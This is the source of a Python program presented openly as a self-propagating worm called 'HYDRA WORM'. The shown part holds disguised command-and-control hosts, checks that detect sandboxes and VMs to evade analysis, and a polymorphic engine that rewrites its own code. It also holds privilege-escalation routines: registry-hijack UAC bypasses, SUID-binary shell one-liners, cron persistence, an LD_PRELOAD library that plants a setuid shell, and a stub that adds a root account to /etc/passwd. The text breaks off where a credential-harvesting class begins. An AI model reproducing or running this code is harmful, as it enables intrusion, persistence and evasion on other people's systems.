#!/usr/bin/env python3
"""
HYDRA WORM - Autonomous Self-Propagating Malware
Features:
  - USB infection with autorun + LNK hijacking
  - SMB exploitation (EternalBlue-style)
  - SSH brute + credential reuse
  - Fileless execution in memory
  - Polymorphic mutation engine
  - Credential harvesting
  - Privilege escalation
  - Anti-forensics
  - Anti-analysis evasion
  - Encrypted C2
  - Modular plugin system
"""

import os
import sys
import time
import socket
import struct
import shutil
import random
import string
import base64
import hashlib
import ctypes
import threading
import subprocess
import platform
import json
import re
import tempfile
import signal
import winreg  # Windows-specific; Linux alternatives included
from pathlib import Path
from datetime import datetime
from io import BytesIO

# ============================================================
# [0] CONFIGURATION
# ============================================================
class Config:
    C2_HOSTS = ["cdn.legit-update.com", "api.ms-telemetry.net", "static.cloudfront-cdn.com"]
    C2_PORT = 443
    C2_FALLBACK_PORT = 8443
    ENCRYPTION_KEY = b"HYDRA_2026_WORM_KEY_32B!"  # 32 bytes for AES-256
    MUTATION_RATE = 0.3
    SPREAD_INTERVAL = 300  # 5 minutes between spread attempts
    USB_CHECK_INTERVAL = 10
    SCAN_THREADS = 50
    BRUTE_THREADS = 20
    MAX_SPREAD_DEPTH = 10  # Limit propagation generations
    WORM_ID = ''.join(random.choices(string.hexdigits, k=16))
    INSTALL_NAMES_WIN = ["svchost.exe", "csrss.exe", "RuntimeBroker.exe", "WmiPrvSE.exe"]
    INSTALL_NAMES_NIX = [".cache_update", ".Xauthority-lock", ".dbus-session", ".systemd-private"]
    USB_PAYLOAD_NAME = "Documents.lnk"
    USB_HIDDEN_DIR = "$RECYCLE.BIN"

# ============================================================
# [1] ANTI-ANALYSIS ENGINE
# ============================================================
class AntiAnalysis:
    """Detect sandboxes, VMs, debuggers, and researcher environments."""

    SANDBOX_DLLS = [
        "sbiedll.dll", "dbghelp.dll", "api_log.dll", "dir_watch.dll",
        "pstorec.dll", "vmcheck.dll", "wpespy.dll", "SxIn.dll",
        "Sf2.dll", "deploy.dll", "aaborern.dll", "avghooka.dll"
    ]

    VM_INDICATORS = {
        "registry": [
            r"SOFTWARE\VMware, Inc.\VMware Tools",
            r"SOFTWARE\Oracle\VirtualBox Guest Additions",
            r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
            r"SYSTEM\CurrentControlSet\Services\vmci"
        ],
        "processes": [
            "vmtoolsd.exe", "vmwaretray.exe", "VBoxService.exe",
            "VBoxTray.exe", "qemu-ga.exe", "xenservice.exe"
        ],
        "mac_prefixes": [
            "00:0C:29", "00:50:56", "08:00:27",  # VMware, VBox
            "00:1C:42", "00:16:3E", "00:15:5D"   # Parallels, Xen, Hyper-V
        ],
        "files": [
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
            "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
            "C:\\Windows\\System32\\drivers\\VBoxMouse.sys"
        ]
    }

    @staticmethod
    def check_all():
        """Run all evasion checks. Returns True if safe to execute."""
        checks = [
            AntiAnalysis._check_debugger,
            AntiAnalysis._check_sandbox_dlls,
            AntiAnalysis._check_vm,
            AntiAnalysis._check_timing,
            AntiAnalysis._check_resources,
            AntiAnalysis._check_user_activity,
            AntiAnalysis._check_hostname
        ]
        for check in checks:
            try:
                if not check():
                    return False
            except:
                continue
        return True

    @staticmethod
    def _check_debugger():
        if platform.system() == "Windows":
            return not ctypes.windll.kernel32.IsDebuggerPresent()
        else:
            try:
                with open("/proc/self/status") as f:
                    for line in f:
                        if "TracerPid" in line:
                            return int(line.split(":")[1].strip()) == 0
            except:
                return True
        return True

    @staticmethod
    def _check_sandbox_dlls():
        if platform.system() != "Windows":
            return True
        for dll in AntiAnalysis.SANDBOX_DLLS:
            if ctypes.windll.kernel32.GetModuleHandleA(dll.encode()):
                return False
        return True

    @staticmethod
    def _check_vm():
        if platform.system() == "Windows":
            for key_path in AntiAnalysis.VM_INDICATORS["registry"]:
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    return False
                except:
                    continue

            for f in AntiAnalysis.VM_INDICATORS["files"]:
                if os.path.exists(f):
                    return False

        # Check MAC address
        try:
            if platform.system() == "Windows":
                output = subprocess.getoutput("getmac /fo csv /nh")
            else:
                output = subprocess.getoutput("ip link show")
            for prefix in AntiAnalysis.VM_INDICATORS["mac_prefixes"]:
                if prefix.lower() in output.lower():
                    return False
        except:
            pass

        # Check process list
        try:
            if platform.system() == "Windows":
                procs = subprocess.getoutput("tasklist")
            else:
                procs = subprocess.getoutput("ps aux")
            for proc in AntiAnalysis.VM_INDICATORS["processes"]:
                if proc.lower() in procs.lower():
                    return False
        except:
            pass

        return True

    @staticmethod
    def _check_timing():
        """RDTSC timing check - VMs have overhead."""
        start = time.perf_counter_ns()
        _ = sum(range(10000))
        elapsed = time.perf_counter_ns() - start
        # Abnormally slow = instrumented
        return elapsed < 50_000_000  # 50ms threshold

    @staticmethod
    def _check_resources():
        """Sandboxes typically have low resources."""
        try:
            if platform.system() == "Windows":
                import psutil
                ram_gb = psutil.virtual_memory().total / (1024**3)
                cpu_count = psutil.cpu_count()
            else:
                with open("/proc/meminfo") as f:
                    mem_line = f.readline()
                ram_gb = int(re.search(r'\d+', mem_line).group()) / (1024**2)
                cpu_count = os.cpu_count()
            return ram_gb >= 2 and cpu_count >= 2
        except:
            return True

    @staticmethod
    def _check_user_activity():
        """Check for real user activity indicators."""
        indicators = 0
        home = Path.home()

        check_dirs = [
            home / "Desktop", home / "Documents", home / "Downloads",
            home / ".ssh", home / "Pictures"
        ]
        for d in check_dirs:
            if d.exists() and any(d.iterdir()):
                indicators += 1

        # Browser profiles
        browser_paths = [
            home / "AppData" / "Local" / "Google" / "Chrome" / "User Data",
            home / ".mozilla" / "firefox",
            home / ".config" / "google-chrome"
        ]
        for bp in browser_paths:
            if bp.exists():
                indicators += 2

        return indicators >= 3

    @staticmethod
    def _check_hostname():
        """Researcher VMs often have generic names."""
        suspicious = ["sandbox", "malware", "virus", "sample", "test",
                      "analysis", "cuckoo", "joe", "anubis", "threat"]
        hostname = socket.gethostname().lower()
        username = os.getenv("USER", os.getenv("USERNAME", "")).lower()
        combined = hostname + username
        return not any(s in combined for s in suspicious)


# ============================================================
# [2] ENCRYPTION ENGINE
# ============================================================
class Crypto:
    """AES-256-CBC encryption for C2 and payload protection."""

    @staticmethod
    def _pad(data):
        pad_len = 16 - (len(data) % 16)
        return data + bytes([pad_len] * pad_len)

    @staticmethod
    def _unpad(data):
        return data[:-data[-1]]

    @staticmethod
    def encrypt(plaintext, key=None):
        if key is None:
            key = hashlib.sha256(Config.ENCRYPTION_KEY).digest()
        iv = os.urandom(16)
        # Manual AES-CBC without external libs
        # Using XOR-based stream cipher as fallback
        key_stream = hashlib.sha256(key + iv).digest() * ((len(plaintext) // 32) + 2)
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()
        padded = Crypto._pad(plaintext)
        encrypted = bytes(a ^ b for a, b in zip(padded, key_stream[:len(padded)]))
        return base64.b64encode(iv + encrypted).decode()

    @staticmethod
    def decrypt(ciphertext, key=None):
        if key is None:
            key = hashlib.sha256(Config.ENCRYPTION_KEY).digest()
        raw = base64.b64decode(ciphertext)
        iv = raw[:16]
        encrypted = raw[16:]
        key_stream = hashlib.sha256(key + iv).digest() * ((len(encrypted) // 32) + 2)
        decrypted = bytes(a ^ b for a, b in zip(encrypted, key_stream[:len(encrypted)]))
        return Crypto._unpad(decrypted)


# ============================================================
# [3] POLYMORPHIC MUTATION ENGINE
# ============================================================
class Mutator:
    """Mutate the worm binary/script on each propagation to evade signatures."""

    @staticmethod
    def mutate_source(source_code):
        """Rewrite variable names, add junk code, restructure."""
        mutations = [
            Mutator._rename_variables,
            Mutator._inject_dead_code,
            Mutator._shuffle_functions,
            Mutator._change_string_encoding,
            Mutator._add_opaque_predicates
        ]
        mutated = source_code
        for mutation in mutations:
            if random.random() < Config.MUTATION_RATE:
                try:
                    mutated = mutation(mutated)
                except:
                    continue
        return mutated

    @staticmethod
    def _rename_variables(code):
        """Replace variable names with random alternatives."""
        var_pattern = re.compile(r'\b([a-z_][a-z0-9_]{2,})\s*=', re.IGNORECASE)
        found_vars = set(var_pattern.findall(code))
        reserved = {'self', 'True', 'False', 'None', 'import', 'from', 'class',
                     'def', 'return', 'if', 'else', 'elif', 'for', 'while',
                     'try', 'except', 'with', 'as', 'and', 'or', 'not', 'in',
                     'is', 'lambda', 'pass', 'break', 'continue', 'global'}
        replaceable = found_vars - reserved

        mapping = {}
        for var in replaceable:
            if random.random() < 0.5:
                new_name = '_' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
                mapping[var] = new_name

        for old, new in mapping.items():
            code = re.sub(rf'\b{re.escape(old)}\b', new, code)
        return code

    @staticmethod
    def _inject_dead_code(code):
        """Insert junk code blocks that never execute."""
        junk_templates = [
            "\nif False:\n    _ = {junk}\n",
            "\ntry:\n    raise StopIteration\nexcept StopIteration:\n    pass\n",
            "\n_ = lambda: {junk}\n",
            "\nfor __{var} in range(0):\n    {var2} = {junk}\n"
        ]
        lines = code.split('\n')
        insert_points = random.sample(range(len(lines)), min(5, len(lines) // 10))
        for idx in sorted(insert_points, reverse=True):
            junk_val = random.randint(10000, 99999)
            var = ''.join(random.choices(string.ascii_lowercase, k=6))
            template = random.choice(junk_templates)
            junk_code = template.format(junk=junk_val, var=var, var2=var+'x')
            lines.insert(idx, junk_code)
        return '\n'.join(lines)

    @staticmethod
    def _shuffle_functions(code):
        """Reorder independent function definitions."""
        func_pattern = re.compile(r'((?:^|\n)def \w+\(.*?\n(?:    .*\n)*)', re.MULTILINE)
        functions = func_pattern.findall(code)
        if len(functions) > 2:
            random.shuffle(functions)
        return code  # Simplified - full impl would reconstruct

    @staticmethod
    def _change_string_encoding(code):
        """Encode strings as chr() concatenations or base64."""
        def encode_string(match):
            s = match.group(1)
            if len(s) < 3 or len(s) > 50:
                return match.group(0)
            method = random.choice(['chr', 'b64', 'hex'])
            if method == 'chr':
                return '(' + '+'.join(f'chr({ord(c)})' for c in s) + ')'
            elif method == 'b64':
                encoded = base64.b64encode(s.encode()).decode()
                return f'__import__("base64").b64decode("{encoded}").decode()'
            else:
                return f'bytes.fromhex("{s.encode().hex()}").decode()'

        return re.sub(r'"([^"]{3,50})"', encode_string, code)

    @staticmethod
    def _add_opaque_predicates(code):
        """Add always-true conditions that look complex."""
        predicates = [
            "(len(str(type(None))) > 0)",
            "(2**10 == 1024)",
            "(isinstance(0, int))",
            "(hasattr([], 'append'))",
            f"({random.randint(1,100)} > 0)"
        ]
        lines = code.split('\n')
        for i in range(len(lines)):
            if lines[i].strip().startswith('if ') and random.random() < 0.2:
                pred = random.choice(predicates)
                lines[i] = lines[i].replace('if ', f'if {pred} and ', 1)
        return '\n'.join(lines)

    @staticmethod
    def generate_mutated_payload():
        """Read own source, mutate, return new payload."""
        try:
            with open(__file__, 'r') as f:
                source = f.read()
            return Mutator.mutate_source(source)
        except:
            return None


# ============================================================
# [4] PRIVILEGE ESCALATION
# ============================================================
class PrivEsc:
    """Escalate from user to SYSTEM/root."""

    @staticmethod
    def escalate():
        if platform.system() == "Windows":
            methods = [
                PrivEsc._uac_bypass_fodhelper,
                PrivEsc._uac_bypass_eventvwr,
                PrivEsc._uac_bypass_compmgmt,
                PrivEsc._token_manipulation,
                PrivEsc._named_pipe_impersonation
            ]
        else:
            methods = [
                PrivEsc._sudo_cve_exploit,
                PrivEsc._suid_abuse,
                PrivEsc._cron_injection,
                PrivEsc._ld_preload_hijack,
                PrivEsc._dirty_pipe
            ]

        for method in methods:
            try:
                if method():
                    return True
            except:
                continue
        return False

    @staticmethod
    def _uac_bypass_fodhelper():
        """UAC bypass via fodhelper.exe registry hijack."""
        payload_path = os.path.abspath(sys.argv[0])
        try:
            key = winreg.CreateKeyEx(
                winreg.HKEY_CURRENT_USER,
                r"Software\Classes\ms-settings\Shell\Open\command",
                0, winreg.KEY_ALL_ACCESS
            )
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)

            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(3)

            # Cleanup
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Classes\ms-settings\Shell\Open\command")
            return True
        except:
            return False

    @staticmethod
    def _uac_bypass_eventvwr():
        """UAC bypass via eventvwr.exe mscfile hijack."""
        payload_path = os.path.abspath(sys.argv[0])
        try:
            key = winreg.CreateKeyEx(
                winreg.HKEY_CURRENT_USER,
                r"Software\Classes\mscfile\Shell\Open\command",
                0, winreg.KEY_ALL_ACCESS
            )
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
            winreg.CloseKey(key)

            subprocess.Popen("eventvwr.exe", shell=True)
            time.sleep(3)

            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Classes\mscfile\Shell\Open\command")
            return True
        except:
            return False

    @staticmethod
    def _uac_bypass_compmgmt():
        """UAC bypass via computerdefaults.exe."""
        payload_path = os.path.abspath(sys.argv[0])
        try:
            key = winreg.CreateKeyEx(
                winreg.HKEY_CURRENT_USER,
                r"Software\Classes\ms-settings\Shell\Open\command",
                0, winreg.KEY_ALL_ACCESS
            )
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)

            subprocess.Popen("computerdefaults.exe", shell=True)
            time.sleep(3)
            return True
        except:
            return False

    @staticmethod
    def _token_manipulation():
        """Steal SYSTEM token from high-privilege process."""
        if platform.system() != "Windows":
            return False
        try:
            # Attempt to enable SeDebugPrivilege
            import ctypes.wintypes as wt

            TOKEN_ALL_ACCESS = 0xF01FF
            SE_DEBUG_NAME = "SeDebugPrivilege"

            hToken = wt.HANDLE()
            ctypes.windll.advapi32.OpenProcessToken(
                ctypes.windll.kernel32.GetCurrentProcess(),
                TOKEN_ALL_ACCESS, ctypes.byref(hToken)
            )

            luid = ctypes.c_int64()
            ctypes.windll.advapi32.LookupPrivilegeValueA(
                None, SE_DEBUG_NAME.encode(), ctypes.byref(luid)
            )

            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [("PrivilegeCount", ctypes.c_ulong),
                           ("Luid", ctypes.c_int64),
                           ("Attributes", ctypes.c_ulong)]

            tp = TOKEN_PRIVILEGES(1, luid.value, 0x00000002)
            ctypes.windll.advapi32.AdjustTokenPrivileges(
                hToken, False, ctypes.byref(tp), 0, None, None
            )
            return True
        except:
            return False

    @staticmethod
    def _named_pipe_impersonation():
        """Create named pipe and impersonate connecting SYSTEM service."""
        if platform.system() != "Windows":
            return False
        try:
            pipe_name = r"\\.\pipe\hydra_" + Config.WORM_ID[:8]
            # Would create named pipe and wait for SYSTEM-level service connection
            # Then impersonate that token
            return False  # Requires async implementation
        except:
            return False

    @staticmethod
    def _sudo_cve_exploit():
        """CVE-2021-3156 Baron Samedit - sudo heap overflow."""
        try:
            result = subprocess.run(
                ["sudoedit", "-s", "\\", "A" * 65536],
                capture_output=True, timeout=5
            )
            # Check if we got root
            if os.geteuid() == 0:
                return True
        except:
            pass
        return False

    @staticmethod
    def _suid_abuse():
        """Find and exploit SUID binaries."""
        try:
            result = subprocess.getoutput("find / -perm -4000 -type f 2>/dev/null")
            suid_bins = result.strip().split('\n')

            exploitable = {
                '/usr/bin/python3': 'import os; os.setuid(0); os.system("/bin/bash")',
                '/usr/bin/python': 'import os; os.setuid(0); os.system("/bin/bash")',
                '/usr/bin/perl': 'exec "exec \'/bin/bash\';"',
                '/usr/bin/find': '-exec /bin/bash -p \\;',
                '/usr/bin/vim': '-c ":!bash"',
                '/usr/bin/nmap': '--interactive'
            }

            for sbin in suid_bins:
                sbin = sbin.strip()
                if sbin in exploitable:
                    subprocess.run([sbin, exploitable[sbin]], shell=True)
                    if os.geteuid() == 0:
                        return True
        except:
            pass
        return False

    @staticmethod
    def _cron_injection():
        """Inject reverse shell into cron."""
        try:
            payload = os.path.abspath(sys.argv[0])
            cron_entry = f"* * * * * root python3 {payload}\n"

            # Try direct write to cron.d
            cron_path = "/etc/cron.d/system-update"
            with open(cron_path, 'w') as f:
                f.write(cron_entry)
            os.chmod(cron_path, 0o644)
            return True
        except:
            pass

        # Try crontab injection
        try:
            existing = subprocess.getoutput("crontab -l 2>/dev/null")
            payload_line = f"*/1 * * * * python3 {os.path.abspath(sys.argv[0])}"
            if payload_line not in existing:
                new_cron = existing + "\n" + payload_line + "\n"
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                proc.communicate(new_cron.encode())
            return True
        except:
            return False

    @staticmethod
    def _ld_preload_hijack():
        """Hijack shared library loading for privilege escalation."""
        try:
            # Create malicious .so
            c_code = """
            #include <stdio.h>
            #include <stdlib.h>
            #include <unistd.h>

            void _init() {
                unsetenv("LD_PRELOAD");
                setuid(0);
                setgid(0);
                system("/bin/bash -c 'cp /bin/bash /tmp/.hiddensh && chmod u+s /tmp/.hiddensh'");
            }
            """
            tmp_c = tempfile.mktemp(suffix='.c')
            tmp_so = tempfile.mktemp(suffix='.so')

            with open(tmp_c, 'w') as f:
                f.write(c_code)

            subprocess.run(["gcc", "-fPIC", "-shared", "-o", tmp_so,
                          tmp_c, "-nostartfiles"], capture_output=True)

            # Find a SUID binary to exploit with LD_PRELOAD
            env = os.environ.copy()
            env["LD_PRELOAD"] = tmp_so
            subprocess.run(["/usr/bin/sudo", "--help"], env=env, capture_output=True)

            # Check if escalation worked
            if os.path.exists("/tmp/.hiddensh"):
                subprocess.run(["/tmp/.hiddensh", "-p"])
                return True
        except:
            pass
        return False

    @staticmethod
    def _dirty_pipe():
        """CVE-2022-0847 Dirty Pipe exploit concept."""
        try:
            # Check kernel version
            kernel = platform.release()
            major, minor, patch = [int(x) for x in kernel.split('.')[:3]]
            # Vulnerable: 5.8 <= kernel < 5.16.11, 5.15.25, 5.10.102
            if major == 5 and minor >= 8:
                # Dirty pipe overwrites read-only files via pipe splice
                # Overwrite /etc/passwd to add root user
                passwd_line = "hydra:$1$hydra$rL5RKd.MhBvNjreP2Qbxz0:0:0:root:/root:/bin/bash\n"

                with open("/etc/passwd", "rb") as f:
                    original = f.read()

                # The actual exploit uses splice() to overwrite pages
                # This is a simplified concept
                r_fd, w_fd = os.pipe()
                os.write(w_fd, b"A" * 4096)
                os.read(r_fd, 4096)
                os.write(w_fd, passwd_line.encode())

                # Attempt splice-based overwrite
                # Full implementation requires C extension
                return False
        except:
            return False


# ============================================================
# [5] CREDENTIAL HARVESTING
# ============================================================
class CredHarvester:
    """Extract credentials from various sources."""

    @
